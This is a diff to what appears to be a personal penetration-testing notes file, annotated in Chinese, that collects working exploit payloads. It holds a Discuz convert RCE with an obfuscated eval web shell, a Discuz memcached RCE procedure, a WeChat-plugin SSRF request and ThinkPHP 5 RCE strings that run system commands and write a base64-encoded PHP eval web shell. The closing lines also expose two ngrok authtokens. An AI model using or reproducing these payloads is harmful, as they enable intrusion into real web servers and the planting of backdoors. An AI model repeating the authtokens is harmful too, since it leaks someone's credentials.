@@ -124,6 +124,30 @@ discuz
 lanvna=
 /dz/utility/convert/index.php[data]a=config&source=d7.2_x1.5&submit=yes&newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(108).CHR(97).CHR(110).CHR(118).CHR(110).CHR(97).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa
 
+telnet 1.1.1.1 11211  目标11211端口，stats cachedump 1 0
+set xxxxxx_setting 1 0 yyy    //xxxx为前缀，discuz定义的，可以使用stats cachedump 命令查看。yyy为payload长度
+https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Discuz/Discuz%21%20X3.4%20Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%AF%BC%E8%87%B4%E7%9A%84rce/
+微信登录利用
+nc -nvvlp 127.0.0.1 9090
+http://target/plugin.php?id=wechat:wechat&ac=wxregister&username=vov&avatar=http://localhost:9090/dz-weixin-plugin-ssrf&wxopenid=dont_be_evil
+
+
+https://github.com/ianxtianxt/Phpweb-Getshell-py/blob/master/Main.py
+
+
+thinkphp
+path1:/public
+path2:?s=index/index/index
+[data]s=whoami&_method=__construct&method&filter[]=system
+[data]s=var_dump(scandir('../application/'))&_method=__construct&filter=assert --查看文件夹及文件
+[data]s=whoami&_method=__construct&method&filter[]=system   --命令执行
+[data]s=file_put_contents('/data/wwwroot/xxx/',base64_decode('PD9waHAgJHBhc3M9JF9QT1NUWydhZG1pbjEyMyddO2V2YWwoJHBhc3MpOz8+'))&_method=__construct&filter=assert   xxx为路径
+
+
+
+
+
+
 
 ngrok config add-authtoken 2eWvRxll3u2mUA2eK5XhrKHeIWn_4fz7StZCtXPrdJ6qnAh2U
 ngrok config add-authtoken 2eWyFLT4oZEbuVwxwkszPIaR7uM_2BNy6EvMcjn1B5RdcHBiR
